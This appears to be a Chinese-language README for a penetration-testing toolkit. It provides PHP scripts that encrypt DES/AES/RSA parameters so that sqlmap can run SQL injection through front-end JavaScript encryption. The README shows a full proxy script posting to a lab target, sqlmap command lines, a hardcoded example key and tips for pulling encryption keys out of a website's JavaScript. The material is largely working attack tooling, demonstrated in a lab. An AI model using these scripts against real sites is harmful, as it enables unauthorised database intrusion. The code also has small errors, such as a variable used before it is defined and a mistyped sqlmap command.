### 0x01 实现功能

实现DES/AES/RSA批量加密,单个密文的解密以及AES/DES SQL注入脚本，适用场景为渗透测试遇到前端JS加密的时候，以及使用（crypto-js/JSEncrypt加密库）的情况，快速定位key，将目标网站的加密key提取出来，在使用脚本进行测试。

### 0x02 环境需求

需要使用 PHP 7.1 及以下版本，因此mcrypt 加密扩展已经在 PHP 7.2 中被弃用，加解密脚本因为直接调用远端加密库，因此需要能访问互联网，其他脚本不用，php环境可以使用phpStudy，灵活切换php版本。

![06](README.assets/06.jpg)

### 0x03 脚本说明：

#### 加解密脚本

AES_decryption.php 、AES_encrypt.php、DES_decryption.php、DES_encrypt.php

RSA  //不涉及加密模式以及填充方式

//使用ECB，Pkcs7填充模式，如果需要其他模式可以找到mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7，更改ECB以及Pkcs7即可，代码中已添加详细注释；

加密模式（可选项）：

```
CBC
CFB
CTR
CTRGladman
ECB  //不支持IV
OFB
```

填充方式（可选项）：

```
Ansix923
Iso10126
Iso97971
NoPadding
Pkcs7
ZeroPadding
```



#### SQL注入脚本（不同场景需要修改小部分代码，包括key）

AES_SQL.php #**POST方式提交**，使用ECB以及Pkcs7填充方式，ECB模式无法加入随机数；

DES_SQL.php #**GET方式提交**，其余和AES的一样，如果遇到POST的提交方式，把AES的提交方式复制替换就可

其他：

- 加密的模式以及填充方式不同会导致密文不通

- 有使用随机数的可以看test文件夹下的脚本，脚本中有示例，参照进行修改

- 加密模式

  ```
  //CBC
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CBC, $iv);
  
  //CFB
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CFB), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_CFB, $iv);
  
  //OFB
  $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_OFB), MCRYPT_RAND);
  $encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $plaintext, MCRYPT_MODE_OFB, $iv);
  ```

- 填充方式

  ```
  //ISO 10126 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = "";
  for ($i = 0; $i < $pad_size - 1; $i++) {
      $padding .= chr(mt_rand(0, 255));
  }
  $padding .= chr($pad_size);
  $plaintext .= $padding;
  
  //ANSI X.923 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = str_repeat(chr(0), $pad_size - 1) . chr($pad_size);
  $plaintext .= $padding;
  
  //Zero Padding 填充方式：
  $pad_size = $block_size - (strlen($plaintext) % $block_size);
  $padding = str_repeat(chr(0), $pad_size);
  $plaintext .= $padding;
  ```

### 0x04 功能演示

#### AES加密解密脚本演示：（DES和AES一样，相差无几）



效果：



#### SQL注入脚本演示：

脚本执行流程：

GET获取请求后，进行加密，加密后再使用curl给目标站点发送请求，获取响应，sqlmap判断是否存在漏洞； 

演示：

因为没有合适的环境，演示只能证明本端发出的数据包无问题 

拓扑：

10.10.70.10（攻击机）--10.10.70.109漏洞环境

步骤：

a、验证经过php脚本的代理后sqlmap依然能判断出存在sql漏洞

这里有个坑，提交的数据必须要和view soure格式一致

![01](README.assets/01.jpg)

uname=admin&passwd=123456&submit=Submit

那么测试脚本sql_test.php里面提交的参数也必须做调整

```
<?php
// GET方式获取传参，示例：127.0.0.1/sql_test.php?param1=admin&param2=123456
$param1 = $_GET['param1'];
$param2 = $_GET['param2'];

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1,   //对应用户名的参数名
    'passwd' => $param2_base64,  //对应密码的参数名
    'submit' => $sub      //第三个参数，再数组外赋值后带入
);

//向目标网站发送post请求
// 设置POST请求的URL和请求头信息
$url = 'http://10.10.70.109/sqli/Less-11/index.php';   //目标 URL
$headers = array(                             //请求头根据需求自加自减
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
);

// 初始化curl
$ch = curl_init();

// 设置curl的相关参数
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 执行curl请求
$response = curl_exec($ch);

// 关闭curl资源
curl_close($ch);

// 输出响应结果
echo $response;
?>
```

sqlmap

```
qlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param1
```

测试截图

![02](README.assets/02.jpg)

b、验证加密后的参数能准确到达目标服务器，增加加密代码

```
$key = "akcdefg3bcdkffff";   //设置加密密钥

$block_size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB);   //加密模式

//设置$param2的填充方式
$pad_size = $block_size - (strlen($param2) % $block_size);
$param2 .= str_repeat(chr($pad_size), $pad_size);

//参数加密
$param2 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $param2, MCRYPT_MODE_ECB);

// 对密文进行base64，在赋值给$param2_base64
$param2_base64 = base64_encode($param2);

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1,   //对应用户名的参数名
    'passwd' => $param2_base64,  //对应密码的参数名
    'submit' => $sub      //第三个参数，再数组外赋值后带入
);
```

sqlmap

```
sqlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param2
```

测试截图

![03](README.assets/03.jpg)

可以看到用户名为明文，sqlmap提交过来的口令为密文，将第三行密文解密如下：

![04](README.assets/04.jpg)

![05](README.assets/05.jpg)

DES注入脚本一致，因此不做验证。

需要注意的点如下：

- DES使用php编写出来的注入脚本对key的长度有限制，DES key必须小于等于8个字节，在crypto-js中可以超出该限制，所以超过8个字节的key无法使用DES注入脚本，AES无限制；
- 传参必须要和浏览器提交的参数格式一致，注入前先提交一遍，查看格式在改脚本进行注入；
- AES以及DES需要确认加密方式以及填充方式，根据特征寻找。
- 在vscode有一个插件会检查代码错误，版本不符合有些就会标红，不用管。
- 修改脚本中的key

### 0x05 前端寻找key的方式： 

#### 搜索关键词

浏览器F12，search关键词有：encrypt、passwd、password、MD5、AES、DES等

RSA特征

```
new JSEncrypt();
a.setPublicKey("key");
a.encrypt(passwd);

new rsa的加密对象
xxx.set设置publickey     //设置公钥
xxx.调用加密方法（“明文”）  //加密
```

DES特征

```

  key = "ffffffffffff"; // 密钥

  // 将密钥从字符串转换为字节数组
  keyBytes = CryptoJS.enc.Utf8.parse(key); 

  // 使用 DES 加密算法加密消息
  encrypted = CryptoJS.DES.encrypt(message, keyBytes, {
    mode: CryptoJS.mode.ECB, // 使用 ECB 模式
    padding: CryptoJS.pad.Pkcs7, // 使用 PKCS#7 填充方式
  });
```

AES特征

```
function Encrypt(xxx){  
	var xxx  = xxx.enc.Utf8.parse('key');
    var xx = xxx.enc.Utf8.parse(xxx);  
    var xxx = xxx.AES.encrypt(xxx);  
} 
```

搜到关键字后下断点找key，详细的方式待补充：URL